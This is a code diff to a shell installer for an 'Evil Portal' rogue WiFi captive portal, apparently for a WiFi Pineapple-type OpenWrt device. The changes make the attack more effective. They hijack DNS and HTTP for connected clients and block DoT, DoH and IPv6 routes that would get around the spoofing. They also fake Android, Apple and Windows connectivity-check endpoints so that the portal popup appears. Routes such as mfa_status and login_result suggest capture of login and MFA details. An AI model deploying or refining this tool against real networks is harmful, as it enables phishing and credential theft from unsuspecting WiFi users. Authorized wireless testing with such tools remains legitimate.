@@ -25,13 +25,34 @@ if [ "$DIALOG_RESULT" = "1" ]; then
     LOG "Configuring Isolated Evil Network..."
     LOG "=============================================="
     
-    # Add evil network configuration with wlan0wpa as bridge port
-    LOG "Creating br-evil bridge and interface..."
-    echo -e "\nconfig device\n        option name 'br-evil'\n        option type 'bridge'\n\nconfig interface 'evil'\n        option device 'br-evil'\n        option proto 'static'\n        option ipaddr '10.0.0.1'\n        option netmask '255.255.255.0'" >> /etc/config/network
+    # Add evil network configuration (idempotent - skip if already exists)
+    if ! uci -q get network.evil >/dev/null 2>&1; then
+        LOG "Creating br-evil bridge and interface..."
+        uci set network.brevil=device
+        uci set network.brevil.name='br-evil'
+        uci set network.brevil.type='bridge'
+        uci set network.evil=interface
+        uci set network.evil.device='br-evil'
+        uci set network.evil.proto='static'
+        uci set network.evil.ipaddr='10.0.0.1'
+        uci set network.evil.netmask='255.255.255.0'
+        uci commit network
+    else
+        LOG "Network interface 'evil' already exists (skipping)"
+    fi
     
-    # Add DHCP configuration for evil network
-    LOG "Configuring DHCP for evil network..."
-    echo -e "\nconfig dhcp 'evil'\n        option interface 'evil'\n        option start '100'\n        option limit '150'\n        option leasetime '1h'" >> /etc/config/dhcp
+    # Add DHCP configuration (idempotent - skip if already exists)
+    if ! uci -q get dhcp.evil >/dev/null 2>&1; then
+        LOG "Configuring DHCP for evil network..."
+        uci set dhcp.evil=dhcp
+        uci set dhcp.evil.interface='evil'
+        uci set dhcp.evil.start='100'
+        uci set dhcp.evil.limit='150'
+        uci set dhcp.evil.leasetime='1h'
+        uci commit dhcp
+    else
+        LOG "DHCP config for 'evil' already exists (skipping)"
+    fi
     
     # Assign wlan0wpa to evil network
     LOG "Assigning wlan0wpa to evil network..."
@@ -40,12 +61,24 @@ if [ "$DIALOG_RESULT" = "1" ]; then
     
     # Remove wlan0wpa from br-lan bridge
     LOG "Removing wlan0wpa from br-lan..."
-    uci del_list network.brlan.ports='wlan0wpa'
+    uci del_list network.brlan.ports='wlan0wpa' 2>/dev/null
     uci commit network
     
-    # Add evil network to firewall with separate zone
-    LOG "Adding evil network to firewall..."
-    # Create separate zone for evil network
+    # Add evil network to firewall (idempotent - remove duplicates first, then ensure exactly one)
+    LOG "Configuring firewall for evil network..."
+    # Remove ALL existing evil zones and forwardings (clean slate)
+    while uci show firewall 2>/dev/null | grep -q "name='evil'"; do
+        ZONE_IDX=$(uci show firewall 2>/dev/null | grep "name='evil'" | head -1 | sed "s/.*@zone\[\([0-9]*\)\].*/\1/")
+        [ -z "$ZONE_IDX" ] && break
+        uci delete "firewall.@zone[$ZONE_IDX]" 2>/dev/null || break
+    done
+    while uci show firewall 2>/dev/null | grep "forwarding" | grep -q "src='evil'"; do
+        FWD_IDX=$(uci show firewall 2>/dev/null | grep "forwarding" | grep "src='evil'" | head -1 | sed "s/.*@forwarding\[\([0-9]*\)\].*/\1/")
+        [ -z "$FWD_IDX" ] && break
+        uci delete "firewall.@forwarding[$FWD_IDX]" 2>/dev/null || break
+    done
+    
+    # Create exactly one evil zone
     uci add firewall zone
     uci set firewall.@zone[-1].name='evil'
     uci set firewall.@zone[-1].network='evil'
@@ -53,7 +86,7 @@ if [ "$DIALOG_RESULT" = "1" ]; then
     uci set firewall.@zone[-1].output='ACCEPT'
     uci set firewall.@zone[-1].forward='REJECT'
     
-    # Allow evil zone to forward to wan for internet access
+    # Create exactly one evil->wan forwarding
     uci add firewall forwarding
     uci set firewall.@forwarding[-1].src='evil'
     uci set firewall.@forwarding[-1].dest='wan'
@@ -147,13 +180,22 @@ fi
 # Apply network changes now that packages are installed
 if [ "$BRIDGE_IF" = "br-evil" ]; then
     LOG "Applying network changes for isolated subnet..."
+    /etc/init.d/firewall restart
     /etc/init.d/network restart
     sleep 10
     wifi
     # Verify connectivity before proceeding
     LOG "Waiting for network connectivity..."
-    until ping -c1 downloads.openwrt.org &>/dev/null; do sleep 2; done
-    LOG "SUCCESS: Network connectivity restored"
+    WAIT_COUNT=0
+    until ping -c1 downloads.openwrt.org &>/dev/null; do
+        sleep 2
+        WAIT_COUNT=$((WAIT_COUNT + 1))
+        if [ $WAIT_COUNT -gt 30 ]; then
+            LOG "WARNING: Timed out waiting for connectivity, continuing anyway..."
+            break
+        fi
+    done
+    LOG "SUCCESS: Network changes applied"
 fi
 
 # ====================================================================
@@ -165,6 +207,9 @@ mkdir -p /pineapple/ui/modules/evilportal/assets/api
 LOG "Creating index.php..."
 cat > /pineapple/ui/modules/evilportal/assets/api/index.php << 'EOF'
 <?php namespace evilportal;
+
+error_reporting(0);
+ini_set('display_errors', '0');
 
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Cache-Control: post-check=0, pre-check=0", false);
@@ -273,7 +318,7 @@ abstract class Portal
         try {
             $reflector = new \ReflectionClass(get_class($this));
             $logPath = dirname($reflector->getFileName());
-            file_put_contents("{$logPath}/.logs", "{$message}\n", FILE_APPEND);
+            @file_put_contents("{$logPath}/.logs", "{$message}\n", FILE_APPEND);
         } catch (\ReflectionException $e) {
             // do nothing.
         }
@@ -282,28 +327,47 @@ abstract class Portal
     protected function authorizeClient($clientIP)
     {
         if (!$this->isClientAuthorized($clientIP)) {
-            // Just write to file - daemon will add nft rule
+            // Write to file - root daemon will add nft rule within 0.5s
             file_put_contents($this->AUTHORIZED_CLIENTS_FILE, "{$clientIP}\n", FILE_APPEND);
         }
         return true;
     }
 
-    protected function handleAuthorization()
+    public function handleAuthorization()
     {
         if ($this->isClientAuthorized($_SERVER['REMOTE_ADDR']) and isset($this->request->target)) {
             $this->redirect();
          } elseif (isset($this->request->target)) {
              $this->authorizeClient($_SERVER['REMOTE_ADDR']);
              $this->onSuccess();
-             $this->redirect();
+             $this->showSuccess();
          } else {
              $this->showError();
          }
     }
 
+    protected function showSuccess()
+    {
+        header('Content-Type: text/html; charset=utf-8');
+        $target = htmlspecialchars($this->request->target, ENT_QUOTES, 'UTF-8');
+        echo '<!DOCTYPE html><html><head><meta charset="utf-8">';
+        echo '<meta name="viewport" content="width=device-width, initial-scale=1">';
+        echo '<title>Authorized</title>';
+        echo '<style>body{font-family:sans-serif;text-align:center;padding:50px;background:#f0f0f0}';
+        echo '.ok{color:#2e7d32;font-size:48px;margin-bottom:20px}</style></head><body>';
+        echo '<div class="ok">&#10004;</div>';
+        echo '<h1>Authorized!</h1>';
+        echo '<p>You will be redirected in a moment...</p>';
+        echo '<p><a href="' . $target . '">Click here if not redirected</a></p>';
+        echo '<script>setTimeout(function(){window.location.href="' . $target . '";},3000);</script>';
+        echo '</body></html>';
+        exit;
+    }
+
     protected function redirect()
     {
         header("Location: {$this->request->target}", true, 302);
+        exit;
     }
 
     protected function onSuccess()
@@ -318,8 +382,14 @@ abstract class Portal
 
     protected function isClientAuthorized($clientIP)
     {
+        if (!file_exists($this->AUTHORIZED_CLIENTS_FILE)) {
+            return false;
+        }
         $authorizeClients = file_get_contents($this->AUTHORIZED_CLIENTS_FILE);
-        return strpos($authorizeClients, $clientIP);
+        if ($authorizeClients === false) {
+            return false;
+        }
+        return strpos($authorizeClients, $clientIP) !== false;
     }
 }
 EOF
@@ -523,6 +593,18 @@ http {
                 rewrite ^/mfa_status$ /mfa_status.php last;
                 rewrite ^/login_result$ /login_result.php last;
 
+                # Android/Samsung/Windows captive portal detection endpoints
+                # Return 302 redirect to portal - triggers captive portal popup
+                location = /generate_204 { return 302 http://10.0.0.1/; }
+                location = /gen_204 { return 302 http://10.0.0.1/; }
+                location = /hotspot-detect.html { return 302 http://10.0.0.1/; }
+                location = /connectivity-check.html { return 302 http://10.0.0.1/; }
+                location = /ncsi.txt { return 302 http://10.0.0.1/; }
+                location = /connecttest.txt { return 302 http://10.0.0.1/; }
+                location = /connect { return 302 http://10.0.0.1/; }
+                location = /redirect { return 302 http://10.0.0.1/; }
+                location = /success.txt { return 302 http://10.0.0.1/; }
+
                 location ~ \.php$ {
                         fastcgi_split_path_info ^(.+\.php)(/.+)$;
                         fastcgi_pass unix:/var/run/php8-fpm.sock;
@@ -554,9 +636,15 @@ uci commit nginx
 chmod 755 /root
 chmod -R 755 /root/portals/
 
-# Create logs directory with write permissions for PHP-FPM (runs as nobody)
+# Create logs directory with write permissions for PHP-FPM
 mkdir -p /root/logs
 chmod 777 /root/logs
+
+# Ensure PHP-FPM runs as nobody (fix if previous run changed it to root)
+if [ -f /etc/php8-fpm.d/www.conf ]; then
+    sed -i 's/^user = root/user = nobody/' /etc/php8-fpm.d/www.conf
+    sed -i 's/^group = root/group = nogroup/' /etc/php8-fpm.d/www.conf
+fi
 
 LOG "SUCCESS: Permissions configured"
 
@@ -573,11 +661,16 @@ START=99
 add_nft_rules() {
     nft delete table ip evilportal 2>/dev/null
     nft add table ip evilportal
+    # NAT prerouting: redirect DNS and HTTP to portal
     nft add chain ip evilportal prerouting { type nat hook prerouting priority -100 \; policy accept \; }
-    nft add rule ip evilportal prerouting iifname "${BRIDGE_IF}" tcp dport 443 counter dnat to ${PORTAL_IP}:80
     nft add rule ip evilportal prerouting iifname "${BRIDGE_IF}" tcp dport 80 counter dnat to ${PORTAL_IP}:80
     nft add rule ip evilportal prerouting iifname "${BRIDGE_IF}" tcp dport 53 counter dnat to ${PORTAL_IP}:5353
     nft add rule ip evilportal prerouting iifname "${BRIDGE_IF}" udp dport 53 counter dnat to ${PORTAL_IP}:5353
+    # Filter forward: block ALL outbound traffic from evil zone.
+    # This prevents unauthorized clients from using DoT/DoH to bypass DNS spoofing.
+    # Whitelisted (authorized) clients get an accept rule inserted before this drop.
+    nft add chain ip evilportal forward { type filter hook forward priority 0 \; policy accept \; }
+    nft add rule ip evilportal forward iifname "${BRIDGE_IF}" counter drop
 }
 
 remove_nft_rules() {
@@ -585,14 +678,23 @@ remove_nft_rules() {
 }
 
 remove_whitelist_rules() {
+    # Remove whitelist rules from prerouting chain
     nft -a list chain ip evilportal prerouting 2>/dev/null | grep "ip saddr.*accept" | awk '{print \$NF}' | while read handle; do
         nft delete rule ip evilportal prerouting handle "\$handle" 2>/dev/null
+    done
+    # Remove whitelist rules from forward chain
+    nft -a list chain ip evilportal forward 2>/dev/null | grep "ip saddr.*accept" | awk '{print \$NF}' | while read handle; do
+        nft delete rule ip evilportal forward handle "\$handle" 2>/dev/null
     done
 }
 
 # Helper function to start services
 start_services() {
     echo 1 > /proc/sys/net/ipv4/ip_forward
+    # Disable IPv6 on evil bridge - forces Android to use IPv4 DNS
+    # (prevents bypass of DNS spoofing via IPv6)
+    echo 1 > /proc/sys/net/ipv6/conf/${BRIDGE_IF}/disable_ipv6 2>/dev/null
+    echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6 2>/dev/null
     rm -f /tmp/EVILPORTAL_CLIENTS.txt /tmp/EVILPORTAL_PROCESSED.txt
     touch /tmp/EVILPORTAL_CLIENTS.txt
     chmod 666 /tmp/EVILPORTAL_CLIENTS.txt
@@ -606,7 +708,11 @@ start_services() {
     ln -sf /root/portals/Default/MyPortal.php /www/MyPortal.php
     ln -sf /root/portals/Default/helper.php /www/helper.php
 	ln -sf /root/portals/Default/generate_204.html /www/generate_204
+    ln -sf /root/portals/Default/generate_204.html /www/gen_204
     ln -sf /root/portals/Default/hotspot-detect.html /www/hotspot-detect.html
+    ln -sf /root/portals/Default/hotspot-detect.html /www/connectivity-check.html
+    ln -sf /root/portals/Default/hotspot-detect.html /www/ncsi.txt
+    ln -sf /root/portals/Default/hotspot-detect.html /www/connecttest.txt
 
     # Start whitelist daemon
     /usr/bin/evilportal-whitelist-daemon &
@@ -618,7 +724,7 @@ stop_services() {
     /etc/init.d/nginx stop
     kill \$(netstat -plant 2>/dev/null | grep ':5353' | awk '{print \$NF}' | sed 's/\/dnsmasq//g') 2>/dev/null
     killall evilportal-whitelist-daemon 2>/dev/null
-    rm -f /www/captiveportal /www/index.php /www/MyPortal.php /www/helper.php /www/generate_204 /www/hotspot-detect.html
+    rm -f /www/captiveportal /www/index.php /www/MyPortal.php /www/helper.php /www/generate_204 /www/gen_204 /www/hotspot-detect.html /www/connectivity-check.html /www/ncsi.txt /www/connecttest.txt
 
     # Remove whitelist rules
     remove_whitelist_rules
@@ -679,15 +785,16 @@ while true; do
         while read -r ip; do
             # Skip if already processed
             if ! grep -q "^${ip}$" "$PROCESSED_FILE" 2>/dev/null; then
-                # Add nft rule - use dstnat chain directly (always exists)
+                # Add nft accept rules - prerouting (skip DNAT) + forward (allow outbound)
                 nft insert rule ip evilportal prerouting ip saddr "$ip" accept
+                nft insert rule ip evilportal forward ip saddr "$ip" accept
                 # Mark as processed
                 echo "$ip" >> "$PROCESSED_FILE"
                 logger -t evilportal "Whitelisted client: $ip"
             fi
         done < "$CLIENTS_FILE"
     fi
-    sleep 2
+    sleep 0.5
 done
 EOF
 
@@ -706,6 +813,15 @@ LOG "SUCCESS: IP forwarding enabled (NAT rules will be created by init script)"
 # STEP 8: Start Services
 # ====================================================================
 LOG "Step 8: Starting Evil Portal services..."
+
+# Stop any existing Evil Portal services first (idempotent)
+if [ -x /etc/init.d/evilportal ]; then
+    /etc/init.d/evilportal stop 2>/dev/null
+    sleep 1
+fi
+# Kill any orphaned daemons from previous runs
+killall evilportal-whitelist-daemon 2>/dev/null
+kill $(netstat -plant 2>/dev/null | grep ':5353' | awk '{print $NF}' | sed 's/\/dnsmasq//g') 2>/dev/null
 
 /etc/init.d/php8-fpm restart
 /etc/init.d/nginx restart
